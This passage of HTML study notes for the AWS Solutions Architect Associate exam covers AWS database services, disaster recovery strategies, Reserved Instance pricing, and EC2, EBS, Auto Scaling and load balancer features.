- when you want databases managed by RDS on your own datacenter</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="other-database-services"><a class="header" href="#other-database-services">Other Database Services</a></h2>
<hr>
<ul>
<li><b> RedShift </b>
<ul>
<li><ins> petabyte-size data-warehouse </ins></li>
<li>Data warehouses
<ul>
<li>are for <ins>Online Analytical Procesing (OLAP)</ins></li>
<li>can be expensive because they are keeping data ‚Äúhot‚Äù</li>
<li>‚ÄúHOT‚Äù means we can run a very complex query and a large amount of data and get that data very fast</li>
<li>Usage: when you want to quickly generate analytics or reports from a large amount of data</li>
</ul>
</li>
</ul>
</li>
<li><b> ElasticCache </b>
<ul>
<li>a managed database of the <ins> in-memory and caching open-source databases </ins></li>
<li>Redis or Memcached</li>
<li>Usage: when you want to <ins> improve the performance of application </ins> by adding a caching layer in-front of web-server or database</li>
</ul>
</li>
<li><b> Neptune </b>
<ul>
<li>a managed <ins> graph database </ins></li>
<li>Data is represented in interconnected nodes</li>
<li>Usage: when you need to understand the connections between data eg. Mapping Fraud Rings or Social Media Relationships</li>
</ul>
</li>
<li><b> Amazon Timestreams </b>
<ul>
<li>a fully managed <ins>time series database</ins></li>
<li>Related to Devices that send lot of data that are time-sensitive such as IOT devices</li>
<li>Usage: When you need to measure how things change over time</li>
</ul>
</li>
<li><b> Amazon Quantum Ledger Database </b>
<ul>
<li>a fully managed <ins> ledger database </ins> that provides <i> transparent, immutable and cryptographically variable transaction logs </i></li>
<li>Usage: when you need to record history of financial activities that can be trusted</li>
</ul>
</li>
<li><b> Database Migration Service </b>
<ul>
<li>a database migration service</li>
<li>Can migrate from:
<ul>
<li>On-premise database to AWS</li>
<li>from two database in different or same AWS accounts using SQL engines</li>
<li>from a SQL to NOSQL database</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="disaster-recovery"><a class="header" href="#disaster-recovery">Disaster Recovery</a></h1>
<ul>
<li>
<p>RPO: how much data loss are you willing to accept during a disaster</p>
</li>
<li>
<p>RTO: how much downtime can you accept</p>
</li>
<li>
<p><a href="#disaster-recover-in-aws">Disaster Recovery in AWS</a></p>
</li>
<li>
<p><a href="#database-migration-service">Database Migration Service</a></p>
<ul>
<li><a href="#continuous-replication">Continuous Replication</a></li>
<li><a href="#multi-az-deployment">Multi-AZ Deployment</a></li>
</ul>
</li>
<li>
<p><a href="#rds--aurora-mysql-migrations">RDS &amp; Aurora MySQL Migrations</a></p>
</li>
</ul>
<h2 id="disaster-recovery-in-aws"><a class="header" href="#disaster-recovery-in-aws">Disaster Recovery in AWS</a></h2>
<hr>
<ul>
<li>
<p>Any event that has a negative impact on a company‚Äôs business continuity or finances is a disaster</p>
</li>
<li>
<p>Disaster recovery (DR) is about preparing for and recovering from a disaster</p>
</li>
<li>
<p>What kind of disaster recovery?</p>
<ul>
<li>On-premise =&gt; On-Premise: traditional DR and very expensive</li>
<li>On-Premise =&gt; AWS cloud: hybrid recovery</li>
<li>AWS Cloud Region A =&gt; AWS Cloud Region B</li>
</ul>
</li>
<li>
<p>Disaster Recovery Strategies</p>
  <img src="clouds/aws/saa-c03/images/Disaster-Recovery/disaster-recovery-strategies.jpg" width="50%" />
<ul>
<li>
<p>Backup and Restore</p>
<ul>
<li>
<p>High RPO</p>
</li>
<li>
<p>Cheap</p>
</li>
<li>
<p>Easy to implement</p>
<img src="clouds/aws/saa-c03/images/Disaster-Recovery/backup-restore.jpg" width="50%" />
</li>
</ul>
</li>
<li>
<p>Pilot Light</p>
<ul>
<li>small version of the app is always running in the cloud</li>
<li>Useful for the critical core components of the application (Pilot Light)</li>
<li>Very similar to Backup and Restore</li>
<li>Faster than Backup and Restore as critical systems are already up</li>
</ul>
  <img src="clouds/aws/saa-c03/images/Disaster-Recovery/pilot-light.jpg" width="50%" />
</li>
<li>
<p>Warm Standby</p>
<ul>
<li>Full system is up and running, but at minimum size</li>
<li>Upon disaster we can scale to production load</li>
</ul>
  <img src="clouds/aws/saa-c03/images/Disaster-Recovery/warm-standby.jpg" width="50%" />
</li>
<li>
<p>Hot Site/ Multi Site Approach</p>
<ul>
<li>Very low RTO (minutes or seconds) - very expensive</li>
<li>Full production scale is running AWS and On Premise</li>
</ul>
  <img src="clouds/aws/saa-c03/images/Disaster-Recovery/multi-site-hot-site.jpg" width="50%" />
</li>
</ul>
</li>
</ul>
<h2 id="database-migration-service"><a class="header" href="#database-migration-service">Database Migration Service</a></h2>
<ul>
<li>Supports heterogeneous and homogeneous migrations</li>
<li>You must create an EC2 instance to perform the replication tasks</li>
<li>Sources can be on-prem databases or EC2-based databases, Azure SQL Databases, Amazon RDS, Amazon S3, and DocumentDB</li>
<li>Targets can be on-prem databases, Amazon RDS, Redshift, DynamoDB, OpenSearch, Redis, Babelfish, DocumentDB, etc.</li>
<li>AWS Schema Conversion Tool (SCT) can convert the database schema from one engine to another if you are migrating to a different database engine</li>
</ul>
<h2 id="continuous-replication"><a class="header" href="#continuous-replication">Continuous Replication</a></h2>
<img src="clouds/aws/saa-c03/images/Disaster-Recovery/continous-replication.jpg" width="50%" />
<h2 id="multi-az-deployment"><a class="header" href="#multi-az-deployment">Multi-AZ Deployment</a></h2>
<ul>
<li>When Multi-AZ Enabled, DMS provisions and maintains a synchronously stand replica in a different AZ
<ul>
<li>Advantages:
<ul>
<li>Provide Data Redundancy</li>
<li>Eliminates I/O freezes</li>
<li>Minimizes latency spikes</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="rds-to-aurora-migration"><a class="header" href="#rds-to-aurora-migration">RDS to Aurora Migration</a></h2>
<ul>
<li>Options:
<ul>
<li>Snapshot RDS and migrate to Aurora</li>
<li>Create an Aurora Read REplica from RDS mySQL and when the replication lag is 0, promote it as it‚Äôs own DB Cluster</li>
<li>If MySQL is external to RDS, you can backup with Percona XtraBackup and import into Aurora</li>
<li>Use DMS if both databases are up and running</li>
</ul>
</li>
</ul>
<h2 id="on-premise-strategies"><a class="header" href="#on-premise-strategies">On-premise Strategies</a></h2>
<ul>
<li>You can download Amazon Linux ISO and run on-prem hypervisors</li>
<li>Import/export VMs for on-prem to AWS</li>
<li>Use AWS Application Discovery Service to gather info about on-prem VMs and plan a migration
<ul>
<li>Track with AWS migration hub</li>
<li>Agentless Discovery
<ul>
<li>VM inventory, configuration, performance history, etc.</li>
</ul>
</li>
<li>Agent-Based Discovery
<ul>
<li>System configuration, system performance history, running processes, network connection details, etc.</li>
</ul>
</li>
<li>Use Application Migration Service (MGN) to lift-and-shift VMs to AWS</li>
</ul>
</li>
<li>AWS Database Migration Service
<ul>
<li>Migrate data across database engines</li>
<li>Migrate databases from on-prem to AWS</li>
</ul>
</li>
<li>AWS Server Migration
<ul>
<li>Incremental replication of on-prem servers to AWS</li>
<li>Converts on-prem servers to cloud-based servers</li>
</ul>
</li>
</ul>
<h2 id="aws-backup"><a class="header" href="#aws-backup">AWS Backup#</a></h2>
<ul>
<li>Fully managed</li>
<li>Centrally manage and automate backups across all AWS services</li>
<li>AWS Backup supports cross-region backups and cross-account backups</li>
<li>Backup policies are known as Backup Plans</li>
<li>Vault Lock is used to enforce a Write-Once-Read-Many policy (WORM) to ensure backups in the Vault cannot be deleted. Even the root user cannot delete backups when enabled.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="disaster-recovery-cheatsheet"><a href="#disaster-recovery-cheatsheet" class="header">Disaster-recovery-cheatsheet</a></h1>
<ul>
<li>Backup
<ul>
<li>EBS Snapshots, RDS automated backups/ Snapshots etc</li>
<li>Regular pushes to S3/ S3 IA/ Glacier, Lifecycle Policy, Cross Region Replication</li>
<li>From On-Premise:Snowball or Storage Gateway</li>
</ul>
</li>
<li>High availability
<ul>
<li>Use Route 53 to migrate DNS over Region to Region</li>
<li>RDS Multi-AZ, Elastic Cache Multi-AZ, EFS, S3</li>
<li>Site to Site VPN as a recovery from Direct Connect</li>
</ul>
</li>
<li>Replication
<ul>
<li>RDS Replication (Cross Region),AWS Aurora + Global Databases</li>
<li>Database replication from on-premise to RDS</li>
<li>Storage Gateway</li>
</ul>
</li>
<li>Automation
<ul>
<li>CloudFormation / Elastic Beanstalk to re-create a whole new environment</li>
<li>Recover / Reboot Ec2 instances with CloudWatch if alarms fail</li>
<li>AWS Lambda functions for customized automatons</li>
</ul>
</li>
<li>Chaos
<ul>
<li>Netflix has a ‚Äúsimian-army‚Äù randomly terminating EC2</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="savings-plan-1"><a href="#savings-plan-1" class="header">Savings Plan</a></h1>
<ul>
<li><a href="#reserved-instances-ri">Reserved Instances (RI)</a>
<ul>
<li><a href="#term">Term</a></li>
<li><a href="#class">Class</a></li>
<li><a href="#payment-options">Payment Options</a></li>
</ul>
</li>
<li><a href="#reserved-instance-ri-attributes">Reserved Instances Attributes</a></li>
<li><a href="#regional-and-zonal-ri">Regional and Zonal RI</a></li>
<li><a href="#ri-limits">RI Limits</a></li>
<li><a href="#capacity-reservations">Capacity Reservations</a></li>
<li><a href="#standard-vs-convertible-ri">Standard vs Convertible RI</a></li>
<li><a href="#ri-marketplace">RI Marketplace</a></li>
</ul>
<h2 id="savings-plan"><a class="header" href="#savings-plan">Savings Plan</a></h2>
<ul>
<li>Get a discount based on long term usage</li>
<li>Commit to a certain amount of usage</li>
</ul>
<h2 id="spot-instances"><a class="header" href="#spot-instances">Spot Instances</a></h2>
<ul>
<li>Up to 90% discount</li>
<li>Specify a max price you are willing to pay for your instances. If you go over the price, you lose the instance</li>
<li>The MOST cost-efficient instance pricing</li>
<li>Useful for workloads that are resilient to failure (batch jobs, etc.)</li>
</ul>
<h2 id="dedicated-hosts"><a class="header" href="#dedicated-hosts">Dedicated Hosts</a></h2>
<ul>
<li>A physical server with EC2 instance capacity dedicated to your use</li>
<li>Allows you to address compliance or licensing requirements</li>
<li>The most expensive option in AWS</li>
<li>Purchasing OPtions
<ul>
<li>On-demand</li>
<li>Reserved Instances</li>
</ul>
</li>
</ul>
<h2 id="dedicated-instances"><a class="header" href="#dedicated-instances">Dedicated Instances</a></h2>
<ul>
<li>Instances run on hardware dedicated to you</li>
<li>You may share hardware with other instances in same account</li>
<li>No control over instance placement.</li>
</ul>
<h2 id="reserved-instances-ri"><a class="header" href="#reserved-instances-ri">Reserved Instances (RI)</a></h2>
<ul>
<li>Designed for applications that have a <b><ins> steady state,</ins> <ins> predictable usage</ins> </b> or require <b><ins> reserved capacity.</ins> </b></li>
<li>Reduced Pricing is based on <b> Term</b> x <b>Class Offering </b> x <b>Payment Option </b>
<ul>
<li>
<h3 id="term"><a class="header" href="#term">Term</a></h3>
<ul>
<li><i>{The longer the term the greater the savings}</i></li>
<li>Commit to <ins> 1 year or 3 Year contract </ins></li>
<li>Reserved Instances do not renew automatically</li>
<li>When it is <ins> expired it will use on-demand </ins> with no interruption to service</li>
</ul>
</li>
<li>
<h3 id="class"><a class="header" href="#class">Class</a></h3>
<ul>
<li><i> {The less flexible the greater savings} </i></li>
<li><b> Standard </b>
<ul>
<li>Up to 75% reduced pricing compared to on-demand</li>
<li>Can modify RI attributes</li>
</ul>
</li>
<li><b> Convertible </b>
<ul>
<li>Up to 54% reduced pricing compared to on-demand</li>
<li>can exchange RI based on RI attributes if greater or equal in value</li>
</ul>
</li>
<li><strike> <b> Scheduled </b></strike>
<ul>
<li>AWS no longer offers Scheduled RI</li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="payment-options"><a class="header" href="#payment-options">Payment Options</a></h3>
<ul>
<li><i> {The greater upfront the greater savings} </i></li>
<li><b> All upfront </b> : full payment at the start</li>
<li><b> Partial Upfront </b> : A portion of the cost must be paid and remaining hours billed at a discounted hourly rate</li>
<li><b> No Upfront </b> : billed at a discounted hourly rate for every hour within the term,regardless of whether the Reserved Instance is being used</li>
</ul>
</li>
<li><i><ins> RIs can be shared between multiple accounts within AWS organization </ins> </i></li>
<li><b>Unused RIs </b> can be sold in the <ins><i> Reserved Instance Marketplace</i></ins></li>
</ul>
</li>
</ul>
<h2 id="reserved-instance-ri-attributes"><a class="header" href="#reserved-instance-ri-attributes">Reserved Instance (RI) Attributes</a></h2>
<ul>
<li>RI attributes
<ul>
<li>are limited based on class offering and can affect the final price of an RI instance</li>
<li>4 RI attributes:
<ul>
<li><b>Instance Type:</b>
<ul>
<li>eg. m4.Large. This is composed of the instance family (for example , m4) and the instance size (for example large)</li>
</ul>
</li>
<li><b> Region:</b>
<ul>
<li>The region in which the Reserved Instance is purchased</li>
</ul>
</li>
<li><b>Tenancy:</b>
<ul>
<li>Whether your instance runs on shared(default) or single-tenant (dedicated) hardware</li>
</ul>
</li>
<li><b>Platform:</b>
<ul>
<li>the operating system eg. Windows or Linux/Unix</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="regional-and-zonal-ri"><a class="header" href="#regional-and-zonal-ri">Regional and Zonal RI</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Regional RI : purchase for a region</th><th>Zonal RI : purchase for an Availability Zone</th></tr>
</thead>
<tbody>
<tr><td>does not reserve capacity</td><td>reserves capacity in the specified Availability Zone</td></tr>
<tr><td>RI discount applies to instance usage in <ins> any AZ</ins> in the Region</td><td>RI discount applies to instance in the <ins> selected AZ </ins> (No AZ Flexibility)</td></tr>
<tr><td>Ri discount applied to instance usage within the instance family, regardless of size. Only supported n Amazon Linux, Unix Reserved Instances with default tenancy</td><td>No instance size flexibility  Ri discounts applies to instance usage for the specified instance type and size only </td></tr>
<tr><td>You can queue purchases for regional RI</td><td>You can‚Äôt queue purchases for Zonal RI</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="ri-limits"><a class="header" href="#ri-limits">RI Limits</a></h2>
<hr>
<ul>
<li>There is a limit to the number of Reserved Instances that you can purchase per month
<ul>
<li>Per month you can purchase
<ul>
<li>20 Regional Reserved Instances per Region</li>
<li>20 Zonal Reserved Instances per AZ</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Regional Limits</th><th>Zonal Limits</th></tr>
</thead>
<tbody>
<tr><td>You cannot exceed your running On-Demand Instance limit by purchasing regional Reserved Instances. The default On-Demand Instance limit is 20.</td><td>You can exceed your running On-Demand Instance limit by purchasing zonal Reserved Instances</td></tr>
<tr><td>Before purchasing RI ensure On-Demand limit is equal to or greater than your RI you intend to purchase</td><td>If you already have 20 running On-Demand Instances, and you purchase 20 Zonal Reserved Instances, you can launch a further 20 On-Demand Instances that match the specifications of your zonal Reserved Instances</td></tr>
</tbody>
</table>
</div>
<h2 id="capacity-reservations"><a class="header" href="#capacity-reservations">Capacity Reservations</a></h2>
<ul>
<li>EC2 instances are backed by different kind of hardware, and so there is a finite amount of servers available within an Availability Zone per instance type or family</li>
<li>You go to launch a specific type of EC2 instance but AWS has ran out of that server</li>
<li>Capacity reservation is a service of EC2 that allows you to request a reserve of EC2 instance type for a specific Region and AZ</li>
</ul>
<h2 id="standard-vs-convertible-ri"><a class="header" href="#standard-vs-convertible-ri">Standard vs Convertible RI</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Standard RI</th><th>Convertible RI</th></tr>
</thead>
<tbody>
<tr><td>RI attributes can be modified  - Change the AZ within same Region  - Change the scope of the Zonal RI to Regional RI or visa versa  - Change the instance size (Linux/Unix only, default tenancy)  - Change network from Ec2-Classic to VPC and visa versa</td><td>RI attributes can‚Äôt be modified (you perform an exchange)</td></tr>
<tr><td>Can‚Äôt be exchanged</td><td>Can be exchanged during the term for another Convertible RI with new RI attributes, including:  - Instance type  - Instance Family  - Platform  - Scope  - Tenancy</td></tr>
<tr><td>Can be bought or sold in the RI Marketplace</td><td>Can‚Äôt be bought or Sold in the RI Marketplace</td></tr>
</tbody>
</table>
</div>
<h2 id="ri-marketplace"><a class="header" href="#ri-marketplace">RI Marketplace</a></h2>
<ul>
<li>
<p>EC2 Reserved Instance Marketplace allows you to sell your unused Standard RI to recoup your RI spend for RI you do not intend or cannot use</p>
</li>
<li>
<p>Reserved Instances can be sold after they have been active for at least 30 days and once AWS has received the upfront payment (if applicable)</p>
</li>
<li>
<p>You must have a US bank account to sell Reserved Instances on the Reserved Instance Marketplace</p>
</li>
<li>
<p>There must be at least one month remaining in the term of the Reserved Instance you are listing</p>
</li>
<li>
<p>You will retain the pricing and capacity benefit of your reservation until it‚Äôs sold and the transaction is complete</p>
</li>
<li>
<p>Your company name ( and address upon request) will be shared with the buyer for tax purposes.</p>
</li>
<li>
<p>A seller can set only the upfront price for a Reserved Instance. The usage price and other configuration (eg. instance type, availability zone, platform) will remain the same as when the Reserved Instance was initially purchased</p>
</li>
<li>
<p>The term length will be rounded down to the nearest month. For example, a reservation with 9 months and 15 days remaining will appear as 9 months on the Reserved Instance Marketplace.</p>
</li>
<li>
<p>You can sell upto $20,000 in Reserved Instances per year. If you need to sell more Reserved Instances</p>
</li>
<li>
<p>Reserved Instances in the GovCloud region cannot be sold on the Reserved Instance Marketplace</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ec2-3"><a href="#ec2-3" class="header">EC2</a></h1>
<ul>
<li><a href="#placement-groups">Placement Groups</a></li>
<li><a href="#elastic-network-interfaces">Elastic Network Interfaces</a></li>
</ul>
<h2 id="ec2-2"><a class="header" href="#ec2-2">EC2</a></h2>
<ul>
<li>EC2 is not just virtual machines, it consists of VMs, EBS, EIP, <a href="#elastic-network-interfaces">ENI</a>, etc.</li>
<li>Use user-data to run a script at launch. This script is only run once at the instances first start and runs as root</li>
<li>t2.micro is part of the free tier</li>
</ul>
<h2 id="ec2-instance-types"><a class="header" href="#ec2-instance-types">EC2 Instance Types</a></h2>
<ul>
<li>General Purpose (t)</li>
<li>Compute Optimized (c)</li>
<li>Memory Optimized (r)</li>
<li>Storage Optimized (i,d,h1)</li>
</ul>
<h2 id="security-groups-2"><a class="header" href="#security-groups-2">Security Groups</a></h2>
<ul>
<li>Security Groups are like a firewall for EC2 instances</li>
<li>Security groups only contain allow rules</li>
<li>Security groups are stateful. Meaning if we have an inbound allow rule, we don‚Äôt need a corresponding outbound allow rule</li>
<li>For the source of the traffic, Security Groups can reference an IP address, other security groups, and prefix lists</li>
<li>Security Groups and VMs have a many-to-many relationship</li>
</ul>
<h2 id="ports-to-know-for-the-exam-1"><a class="header" href="#ports-to-know-for-the-exam-1">Ports to know for the exam</a></h2>
<ul>
<li>21 = FTP</li>
<li>22 = SSH/sFTP</li>
<li>80 = HTTP</li>
<li>443 = HTTPS</li>
<li>3389 = RDP</li>
<li>5432 - Postgresql</li>
<li>3306 - MySQL</li>
<li>Oracle RDS - 1521</li>
<li>MSSQL - 1433</li>
<li>MariaDB - 3306</li>
</ul>
<h2 id="placement-groups"><a class="header" href="#placement-groups">Placement Groups</a></h2>
<ul>
<li>Use Placement Groups when you want to control how your EC2 instances are scheduled on underlying infrastructure</li>
<li>Placement Group strategies
<ul>
<li>Cluster
<ul>
<li>Scheduled EC2 instances into a low-latency group in a single Availability Zone</li>
<li>Use cases:
<ul>
<li>Big Data job that needs to complete fast</li>
<li>Application that needs extremely <ins> low latency and high network throughput </ins>
<img src="clouds/aws/saa-c03/images/Ec2/placement-groups-cluster.jpg" width="57%" /></li>
</ul>
</li>
</ul>
</li>
<li>Spread
<ul>
<li>Pros:
<ul>
<li>Can span across Availability Zones (AZ)</li>
<li>Reduced risk is simultaneous failure</li>
<li>EC2 instances are on different physical hardware</li>
</ul>
</li>
<li>Cons:
<ul>
<li>Limited to 7 instances per AZ per placement group</li>
</ul>
</li>
<li>Use cases:
<ul>
<li>Application that needs to maximize high availability</li>
<li>Critical Applications where each instance must be isolated from failure from each other
<img src="clouds/aws/saa-c03/images/Ec2/placement-group-spread.jpg" width="57%" /></li>
</ul>
</li>
</ul>
</li>
<li>Partition
<ul>
<li>Spreads instances across many different partitions (which rely on sets of racks) within an AZ. Scales to 100s of EC2 instances per group</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="elastic-network-interfaces"><a class="header" href="#elastic-network-interfaces">Elastic Network Interfaces</a></h2>
<ul>
<li>The ENI can have the following attributes:
<ul>
<li>Primary private IPV4, one or more secondary IPv4</li>
<li>One ELastic IP (IPv4) per private IPv4</li>
<li>One or more Security Groups</li>
<li>A MAC address</li>
</ul>
</li>
<li>You can create ENI independently and attach them on fly (move them) on EC2 instances for failover</li>
<li><i><strong><ins>Bound to a specific availability zone (AZ)</ins>
<img src="clouds/aws/saa-c03/images/Ec2/elastic-network-interface.jpg" width="57%" /></strong></i></li>
<li>You can change the Termination Behavior so that if a VM is deleted the attached ENI is/isn‚Äôt deleted with it</li>
</ul>
<h2 id="spot-instances-1"><a class="header" href="#spot-instances-1">Spot Instances</a></h2>
<ul>
<li>Up to 90% discount</li>
<li>Specify a max price you are willing to pay for your instances. If you go over the price, you have two options:
<ul>
<li>Two minute grace period</li>
<li>Stop the instance or terminate the instance</li>
</ul>
</li>
<li>If you don‚Äôt want AWS to reclaim the capacity, you can use a Spot Block to block AWS from reclaiming the instance for a specified time-frame (1-6 hours)</li>
<li>The MOST cost-efficient instance pricing</li>
<li>Useful for workloads that are resilient to failure (batch jobs, etc.)</li>
<li>Persistent vs. One-Time Spot Requests. With a persistent spot request, if an instance is terminated, it will be restarted. With a one-time spot request, if an instance is terminated, it will NOT be restarted.</li>
</ul>
<h2 id="spot-fleets"><a class="header" href="#spot-fleets">Spot Fleets</a></h2>
<ul>
<li>Get a set of spot instances + On-Demand instances</li>
<li>Strategies
<ul>
<li>Lowest Price: Spot Fleet will launch instances from the pool with the lowest price</li>
<li>Diversified: distributed across all pools</li>
<li>capacityOptimized: pool with optimal capacity for the number of instances</li>
<li>priceCapacityOptimized: Pools with highest capacity available, then select the pool with the lowest price</li>
</ul>
</li>
</ul>
<h2 id="elastic-ips"><a class="header" href="#elastic-ips">Elastic IPs</a></h2>
<ul>
<li>When you start and stop an EC2 instance, the public IP won‚Äôt change</li>
<li>You can only have 5 Elastic IP addresses in your AWS account by default. You can ask AWS to increase this limit.</li>
<li>Try to avoid using EIP</li>
</ul>
<h2 id="ec2-hibernate"><a class="header" href="#ec2-hibernate">EC2 Hibernate</a></h2>
<ul>
<li>Store the RAM on disk when the OS is stopped.</li>
<li>Faster startup</li>
<li>The root EBS volume must be encrypted and it must have enough space to store the contents of RAM</li>
<li>Instance RAM size must be less than 150GB</li>
<li>Does not work for bare metal instances</li>
</ul>
<h2 id="ebs"><a class="header" href="#ebs">EBS</a></h2>
<ul>
<li>Bound to an AZ</li>
<li>Can be attached/detached from instances on the fly</li>
<li>EBS volumes can be mounted to multiple instances using ‚Äòmulti-attach‚Äô
<ul>
<li>Up to 16 instances at a time can be attached to a volume</li>
</ul>
</li>
<li>You can move an EBS volume across AZ by creating a snapshot and copying it to another region</li>
<li>Snapshots
<ul>
<li>You can move a snapshot to an ‚Äòarchive tier‚Äô that is 75% cheaper</li>
<li>Takes 24 to 72 hours to restore the snapshot from the archive</li>
<li>Recycle Bin
<ul>
<li>You can setup rules to retain deleted snapshots so you can easily recover them</li>
<li>Specify a retention for the recycle bin (from 1 day to 1 year)</li>
</ul>
</li>
<li>Fast Snapshot Restore (FSR)
<ul>
<li>Force full initialization of your snapshot to have no latency on first use.</li>
<li>Expensive to use</li>
</ul>
</li>
</ul>
</li>
<li>Encryption
<ul>
<li>data at rest and data in motion are both encrypted</li>
<li>all snapshots are encrypted</li>
<li>Copying an unencrytped snapshot enables encryption</li>
<li>How to encrypt an unencrypted volume
<ol>
<li>Create a snapshot of the volume</li>
<li>Encrypt the snapshot using the copy function</li>
<li>Create new EBS volume from the snapshot (the volume will be encrypted)</li>
<li>Attach the encrypted volume to the original instance</li>
</ol>
</li>
</ul>
</li>
<li>Root volumes are automatically deleted (Termination Policy) when a EC2 instance is terminated. Other EBS volumes attached to the instance are not deleted unless their termination policy says to delete them on termination of the EC2 instance.</li>
</ul>
<h2 id="ec2-instance-store-1"><a class="header" href="#ec2-instance-store-1">EC2 Instance Store</a></h2>
<ul>
<li>Ephemeral storage</li>
<li>High performance</li>
<li>Use cases:
<ul>
<li>buffer</li>
<li>cache</li>
</ul>
</li>
<li>Data loss when the EC2 instance reboots</li>
</ul>
<h2 id="ami"><a class="header" href="#ami">AMI</a></h2>
<ul>
<li>VM Image</li>
<li>Locked to a region, but can be copied across regions</li>
<li>Types of AMIs:
<ul>
<li>Public (AWS Provided)</li>
<li>Private (created by you)</li>
<li>MarketPlace (3rd party vendor)</li>
</ul>
</li>
</ul>
<h2 id="ebs-volume-types-1"><a class="header" href="#ebs-volume-types-1">EBS Volume Types</a></h2>
<ul>
<li>
<p>Types:</p>
<ul>
<li>gp2/gp3 (SSD): General purpose SSD volume. Balance price and performance</li>
<li>io1/io2 Block Express (SSD): Highest performance SSD volume for mission-critical low-latency or high-throughput workloads</li>
<li>st1 (HDD): Low cost HDD volume designed for frequently accessed, throughput-intensive workloads
<ul>
<li>Cannot be a boot volume</li>
<li>125GB to 16 TB</li>
</ul>
</li>
<li>sc1 (HDD): Lowest cost HDD volume designed for less frequently accessed workloads</li>
</ul>
</li>
<li>
<p>Only GP2/GP3 and IO1/IO2 can be used as a boot volumes</p>
</li>
<li>
<p>With GP3, you can independently set IOPS and throughput. With GP2, they are linked together</p>
</li>
</ul>
<h4 id="provisioned-iops"><a class="header" href="#provisioned-iops">Provisioned IOPS</a></h4>
<ul>
<li>Provisioned IOPS volumes are used for critical business applications with sustained IOPS performance</li>
<li>Great for database workloads</li>
<li>io1 Provisioned IOPS:</li>
<li>If you want to get over 32000 IOPS, you need Nitro 1 or Nitro 2</li>
</ul>
<h2 id="auto-scaling-group-asg"><a class="header" href="#auto-scaling-group-asg">Auto Scaling Group (ASG)</a></h2>
<ul>
<li>Automatically scale out EC2 instances to meet traffic demand. You can scale based on a CloudWatch Alarm (metric), schedule,</li>
<li>Set a minimum capacity, desired capacity, and max capacity</li>
<li>The ASG itself is free</li>
<li>Create a launch template, which specifies how to launch instances within the ASG</li>
<li>Scaling Policies
<ul>
<li>Dynamic Scaling
<ul>
<li>Target Tracking Scaling
<ul>
<li>Simple, example: keep CPU usage around 50%</li>
<li>Target Tracking will create CloudWatch Alarms for you</li>
</ul>
</li>
<li>Simple / Step Scaling
<ul>
<li>When a CloudWatch Alarm is triggered, add 2 instances</li>
</ul>
</li>
</ul>
</li>
<li>Scheduled Scaling
<ul>
<li>Scale based on a schedule</li>
</ul>
</li>
<li>Predictive Scaling
<ul>
<li>Forecast load and scale ahead of time</li>
</ul>
</li>
</ul>
</li>
<li>Scaling cooldown (default 300 seconds). The ASG will not launch or terminate instances</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elastic-load-balancer-1"><a class="header" href="#elastic-load-balancer-1">Elastic Load Balancer</a></h1>
<ul>
<li>Spread load of traffic across multiple downstream instances</li>
<li>
<h2 id="health-check-downstream-instances"><a class="header" href="#health-check-downstream-instances">Health check downstream instances</a></h2>
</li>
<li>SSL Termination</li>
<li>High Availability across zones</li>
<li>Add backend instances to a ‚ÄúTarget Group‚Äù</li>
</ul>
<h2 id="types-of-elb"><a class="header" href="#types-of-elb">Types of ELB</a></h2>
<ul>
<li>
<p>Application Load Balancer (Layer 7)</p>
<ul>
<li>Allows you to route to multiple instances in a Target Group (aka Backend Pool in Azure)</li>
<li>Supports HTTP/2 and websocket</li>
<li>Route based on the path in the URL, hostname, query strings, and headers</li>
<li>Extra headers added by ALB
<ul>
<li>x-forwarded-for</li>
<li>x-forwarded-proto</li>
<li>x-forwarded-port</li>
</ul>
</li>
<li>ALB has a WAF capability that can be enabled</li>
</ul>
</li>
<li>
<p>Network Load Balancer (Layer 4)</p>
<ul>
<li>High performance, millions of requests per second, and less latency ~100 ms</li>
<li>NLB has one static IP address per AZ, and supports assigning an Elastic IP</li>
<li>Not compatibly with the free tier</li>
</ul>
</li>
<li>
<p>Gateway Load Balancer (Layer 3)</p>
<ul>
<li>Use cases: Send all traffic to a firewall, IDS, IPS, etc.</li>
<li>Supports the GENEVE protocol on port udp/6081</li>
</ul>
</li>
</ul>
<h2 id="sticky-sessions"><a class="header" href="#sticky-sessions">Sticky Sessions</a></h2>
<ul>
<li>Same client is forwarded to the same instance, rather than spreading traffic amongst all instances</li>
<li>Supported by the ALB and NLB</li>
<li>Cookie is set on the client with has an expiration date you control
<ul>
<li>Cookies:
<ul>
<li>Two types of cookie are supported:
<ul>
<li>Application Based Cookie:
<ul>
<li>Custom cookie:
<ul>
<li>Generated by the target</li>
<li>Can include any custom attributes required by the application</li>
<li>The cookie name must be specified individually per target group</li>
<li>You cannot use AWSALB, AWSALBAPP, or AWSALBTG. These are all reserved by AWS</li>
</ul>
</li>
<li>Application Cookie:
<ul>
<li>Generated by the LB itself</li>
<li>Cookie will be AWSALBAPP</li>
</ul>
</li>
</ul>
</li>
<li>Duration-based Cookie
<ul>
<li>Cookie is generated by the load balancer itself</li>
<li>Cookie name is AWSALB for ALB</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="cross-zone-load-balancing"><a class="header" href="#cross-zone-load-balancing">Cross-Zone Load Balancing</a></h2>
<ul>
<li>Each load balancer instance distributes traffic evenly across all registered instances in all AZ</li>
<li>For the ALB, cross-zone load balancing can be enabled/disabled at the target group level. It is enabled by default and there are no additional charges</li>
<li>Can be enabled for NLB and GLB, but additional charges will apply. It is disabled by default.
<img src="clouds/aws/saa-c03/images/Ec2/cross-zone-load-balancing.png" width="57%" /></li>
</ul>
<h2 id="sni"><a class="header" href="#sni">SNI</a></h2>
<ul>
<li>Works with ALB, NLB, and CloudFront</li>
</ul>
